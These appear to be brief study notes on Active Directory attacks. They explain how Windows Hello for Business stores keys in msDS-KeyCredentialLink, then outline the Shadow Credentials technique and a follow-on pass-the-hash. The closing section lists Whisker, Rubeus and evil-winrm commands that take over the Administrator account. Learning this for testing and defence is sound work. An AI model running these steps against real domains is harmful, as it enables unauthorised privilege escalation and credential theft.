AD : Digital database containing objects like users, groups, and computers, each with specific attributes and permissions.

Windows Hello for Business (WHfB) : 
    PUB and PRIVATE keys ( with PIN or biometrics )
    PUB key stored in the attribute msDS-KeyCredentialLink

    ==> Steps for creating a pair of certificates with WHfB :
          1) The TPM creates a public-private key pair for the user's account when they enrol
          2) The client initiates a certificate request to receive a trustworthy certificate. 
             The organisation's certificate issuing authority (CA) receives this request and provides a valid certificate.
          3) The user account's msDS-KeyCredentialLink attribute will be set.

Shadow Credentials attack : compromise an account ( which has the GenericWrite permission over the administrator object visible on the CN attribute ) with that privilege by updating the msDS-KeyCredentialLink with a certificate.

pass-the-hash attack : 
            .\Whisker.exe add /target:Administrator
            ==> that gives you a rubeus command to execute :
            using Rubeus to get the NTLM hash of the impersonated user 
            evil-winrm -i IP_MACHINE -u Administrator -H NTLM_HASH
